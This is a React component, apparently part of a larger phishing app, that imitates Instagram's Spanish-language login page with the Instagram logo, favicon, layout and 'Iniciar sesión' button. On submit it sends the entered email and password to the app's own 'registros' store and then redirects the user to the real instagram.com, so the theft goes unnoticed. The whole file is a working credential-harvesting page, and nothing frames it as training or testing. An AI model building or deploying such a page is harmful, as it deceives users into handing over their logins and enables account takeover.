import { useState, type FormEvent } from 'react';
import { Box, Button, Input, VStack, Text, Flex, Container, Image } from '@chakra-ui/react';
import { useCreateRegistro } from '../../../features/registros/hooks/useRegistros';
import { useDocumentMetadata } from '../../../shared/hooks/useDocumentMetadata';

export const InstagramPage = () => {
    useDocumentMetadata('Instagram', 'https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png');

    const { submitRegistro, loading } = useCreateRegistro();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const success = await submitRegistro({ email, password, pagina: 'instagram' });
        if (success) {
            window.location.href = 'https://www.instagram.com/';
        }
    };

    return (
        <Box minH="100vh" bg="white" display="flex" flexDirection="column">
            {/* Mobile Header (Language selector placeholder optional, but let's keep it clean) */}

            <Container maxW="sm" centerContent pt={12} pb={8}>
                {/* Logo Section */}
                <Box mb={10}>
                    <Image
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png"
                        alt="Instagram"
                        h="50px"
                        mx="auto"
                    />
                </Box>

                {/* Login Form */}
                <form onSubmit={handleSubmit} style={{ width: '100%' }}>
                    <VStack spacing={3}>
                        <Input
                            placeholder="Teléfono, usuario o correo electrónico"
                            bg="#FAFAFA"
                            fontSize="sm"
                            borderRadius="sm"
                            borderColor="gray.300"
                            _placeholder={{ color: 'gray.500' }}
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            isRequired
                            py={6}
                        />

                        <Input
                            type="password"
                            placeholder="Contraseña"
                            bg="#FAFAFA"
                            fontSize="sm"
                            borderRadius="sm"
                            borderColor="gray.300"
                            _placeholder={{ color: 'gray.500' }}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            isRequired
                            py={6}
                        />

                        <Box w="full" textAlign="right">
                            <Text fontSize="xs" color="#385185" fontWeight="500">¿Olvidaste tu contraseña?</Text>
                        </Box>

                        <Button
                            type="submit"
                            w="full"
                            colorScheme="blue"
                            bg="#0095f6"
                            color="white"
                            fontSize="sm"
                            fontWeight="semibold"
                            _hover={{ bg: "#1877f2" }}
                            size="lg"
                            mt={4}
                            borderRadius="8px"
                            isLoading={loading}
                        >
                            Iniciar sesión
                        </Button>
                    </VStack>
                </form>


            </Container>

            {/* Bottom Footer for Mobile */}
            <Box mt="auto" borderTop="1px solid" borderColor="gray.200" py={4} textAlign="center">
                <Text fontSize="sm" color="gray.500">
                    ¿No tienes una cuenta? <Text as="span" color="gray.900" fontWeight="semibold">Regístrate</Text>
                </Text>
            </Box>

            <VStack spacing={4} pb={6}>
                <Text fontSize="xs" color="gray.400">Meta</Text>
            </VStack>
        </Box>
    );
};
